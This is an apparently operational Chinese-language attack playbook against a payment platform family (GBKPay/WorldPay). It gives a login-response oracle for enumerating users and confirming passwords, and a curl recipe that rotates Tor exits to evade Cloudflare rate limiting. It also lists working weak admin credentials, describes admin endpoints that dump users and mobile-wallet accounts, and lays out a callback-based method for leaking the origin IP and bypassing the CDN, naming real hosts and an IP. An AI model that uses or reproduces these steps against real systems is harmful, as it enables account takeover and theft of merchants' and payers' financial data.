# worldpaypp 家族：登录响应 oracle + CF 登录限速绕过 + 后台拖库面

## 1. `POST /api/login` 响应 oracle（JSON 数组信封）

| 返回值 | 语义 |
|---|---|
| `["NoUser"]` | 用户名不存在 |
| `["PasswordError"]` | 用户名存在、**未开 2FA**、密码错 |
| `["TwoFactorAuthCodeError"]` | 用户名存在、**已开 2FA**（2FA 校验跑在密码之前） |
| `["WaitingEnable"]` | 用户名存在、**密码正确**、但账号未启用 |
| `["AccessFailedCountLimit"]` | 账号级锁（~4–5 发失败即锁） |
| `["TryAgainLater"]` / 429 `Just a moment` | CF 边缘限速（≠ 账号锁） |

关键推论：
- **2FA 校验在密码校验之前** ⇒ 开了 2FA 的账号对**任何**密码都回 `TwoFactorAuthCodeError` ⇒ ① 无法判断密码对错；② 这类号**不可喷**。喷密只对回 `PasswordError` 的号有意义。
- `WaitingEnable` 是**密码命中的确证信号** —— 不必登录成功就能确认密码正确。
- 用户名枚举与密码尝试**共用一个失败计数** ⇒ 枚举本身会烧掉该号的尝试预算。

## 2. 绕 CF 登录限速：Tor + 每请求出口隔离

CF 的 `TryAgainLater` / `429 Just a moment` 按**出口 IP** 判定 → 换 IP 即绕。

Tor 默认 `SocksPort 9050 IsolateSOCKSAuth` ⇒ **SOCKS 认证用户名不同 = 电路不同 = 出口 IP 不同**：

```
curl --socks5-hostname 127.0.0.1:9050 --proxy-user "$RANDOM:$RANDOM" \
     -H 'Content-Type: application/json' \
     -d '{"userName":"x","password":"y"}' https://<host>/api/login
```

每次带随机 `--proxy-user` ⇒ 每请求独立出口。实测 CF 限速/挑战全失效。

- 先验证隔离生效：两次随机 proxy-user 打 `https://api.ipify.org`，出口必须不同。
- control port 9051 未开时用不了 `NEWNYM` —— 用 proxy-user 隔离即可，不需要它。
- 并发上限低（>~10–15 并发会出现大量 `000`）→ 逐请求重试，别把并发当吞吐。
- **与「Tor 是脏出口」不冲突**：脏出口只在**目标自己按 IP 做白名单**时有害（芋道 `/admin-api` 回 `403 请加白名单`）；对**只按 IP 计数的 CF 限速**，Tor 是解药。分清这两类闸。

## 3. 弱口令模式（本家族实测命中）

- **用户名 = 密码**：`admin4/admin4`、`adminmiya/adminmiya`（均 UserTypeId=4 管理号、无 2FA）→ 拿到 HS256 JWT（`{"iss":"worldpay","sub":"78"}`，**无 exp**）。
- **平台默认密码 `123456`**：`su77/bd05` + `123456` → `WaitingEnable`（密码正确、账号待启用）。兄弟品牌复现。
- 管理号命名套路：`worldpayadmin`(Admin) / `s4iEz05h`(主号) / `caiwuzu001`(财务) / `lingban1|2` / `worldpaycs` / `admin1..N` / `<brand>abzz|lxzz|lbzz|xpzz|xlzz`。
- **纪律**：锁阈值 ~4 发、账号级、**跨 IP 不失效**、锁 ≥15min 且**每多发一发就续锁** ⇒ 枚出一个号只打 **1–2 发**最可能的组合（用户名=密码 → `123456`），**不要上字典**。

## 4. 拿到管理 JWT 后的拖库面（`/api/admin/*`，`WAuth: Bearer`）

- `searchSimpleUsers` — 全量用户表（含全部管理号、UserTypeId）
- `searchFullUserWhiteIpAddresses` — **商户 API 白名单 IP**（= 真实商户出口 IP）
- `searchFullBKashAccounts` / `searchFullNagadAccounts` / `searchFullRocketAccounts` — 支付账户全量（钱包号、OwnerName、日/月限额、余额、AutoPair）
- `searchFullOrders` / `getOrderStatistics` — **必须带时间区间参数**，否则回 `["NoInterval"]`（400）
- 通道枚举：bKash=34 / Nagad=35 / Rocket=46 / GCash=14
- 管理端常另起独立子域（本家族：`9m9mm.<root>`），**独立用户表**、唯一号 `worldpayadmin`。
- 从 SPA 包导出 522 个接口名做**未鉴权 + 鉴权双轮**全量扫描 → 实测只有 **15 个可读**，其余按 UserTypeId 校验 ⇒「接口多」≠ 攻击面大。

## 5. 源站 IP：网络层否定结论 + **已验证**业务面抓法

### 5.1 网络层否定（别再重跑）

已穷尽且全 0：
- masscan + `Host:` 指纹（只认产品字节串 `GBKPay`；剔 `PlatformName` 与白标 `StarPay`/`WorldPay`/`lucky*` 假阳性；丢弃带 `CF-RAY` 的命中）
- 云厂商亚太段（Aliyun SG/HK、DO、Vultr、Linode、AWS、GCP）+ BD/VN/KH/TH ISP 段，累计 ~150 万 IP
- 证书 SAN 全量扫；5646 词 DNS 暴力 → **全部记录都在 CF 后面，无任何 DNS-only 记录**

⇒ 判定**源站只放行 CF 回源**，纯网络层打不穿。**不要再扩 CIDR。**

### 5.2 ✅ 已验证：`ShopInformUrl` 回调抓出站 IP（首选）

拿到**任意**无 2FA（或能自开 2FA）的管理 JWT 后，让服务器主动回调你控制的 URL → 回调源 IP = 源站出站 IP。**实测通**（落袋 `34.131.195.40` / GCP India，证书 CN=`gbk.worldxpp.com`，直连登录通）。

**步骤（严格按序）：**

1. **自开 2FA（若管理号未开）**：`GET /api/getTwoFactorAuthData` → 回 `{QrCode, Secret}`（TOTP secret 明文吐出）→ 本地算码 → `POST /api/enableTwoFactorAuth {Secret, Code}` → `"success"`。之后登录必须带 `TwoFactorAuthCode`。
2. **刷新 JWT**：启用 2FA 后旧 token 会变 `LoginAgain`；用账号+密码+TOTP 重登拿新 token。
3. **商户 HashKey（可选，商户 API 签名用）**：`POST /api/generateNewHashKey {shopUserId, TwoFactorAuthCode}` → 回明文 HashKey 字符串。
4. **建单**：`POST /api/createOrder`（`WAuth: Bearer <jwt>`），关键字段：
   - `ShopUserLongId` ← `searchSimpleUsers` 里 `UserTypeId=2` 的 `LongId`
   - `ShopInformUrl` / `ShopReturnUrl` ← 你的接收器（`POST https://webhook.site/token` 免费拿 uuid）
   - `PayerKey` / `PayerName` / `PayerAccountNumber` / `PaymentChannelId` / `CurrencyId` / `Amount` / `ShopOrderId`
   - `TwoFactorAuthCode` ← 当前 TOTP（管理号开了 2FA 后**必填**；缺则 `TwoFactorAuthNotEnabled` 或 `CheckEncryptValueFailed`）
5. **触发回调**：`POST /api/informOrders {TrackingNumbers:[<tn>]}` → `"success"`。服务器用 `Go-http-client/2.0` 向 `ShopInformUrl` POST 订单 JSON（含 `EncryptValue`）。
6. **读接收器**：`GET https://webhook.site/token/<uuid>/requests` → `ip` 字段 = **源站出站 IP**。
7. **强制验证（Host 200 ≠ 源站）**：
   ```
   curl -sk --resolve gbk.worldxpp.com:443:<IP> https://gbk.worldxpp.com/api/getSetting
   # 必须含 "PlatformName":"GBKPay"，且无 CF-RAY
   openssl s_client -connect <IP>:443 -servername gbk.worldxpp.com | openssl x509 -noout -subject -ext subjectAltName
   # CN/SAN 必须 = 目标 Host
   ```
   直连登录也应通：`--resolve` + `admin4/admin4` 绕过 CF 拿 JWT。开放端口常含 **22/80/443**。

**坑：**
- `createOrder` 字段不齐会回 `NoPayerKey` / `NoPaymentChannelId` 等，**不等于** LongId 无效。
- 管理号未开 2FA 时 `createOrder` 回 `TwoFactorAuthNotEnabled` → 先走步骤 1。
- `getShopApiSetting` 对管理 JWT 常回 `null`；HashKey 用 `generateNewHashKey` 拿。
- 商户白名单 IP（`searchFullUserWhiteIpAddresses`）是**商户出口**，不是源站；逐个 Host 指纹几乎全 0，别当候选源站扫。
- `admin/getProxySetting` / `updateProxySetting`（含 `TestProxyUrl`）在 **gbk 租户面 404**，只在独立管理端子域（如 `9m9mm.<root>`）存在；管理号锁死时别死等这条，优先走 `ShopInformUrl`。

完整可复现剧本与字段矩阵：`references/shopinformurl-origin-capture.md`。
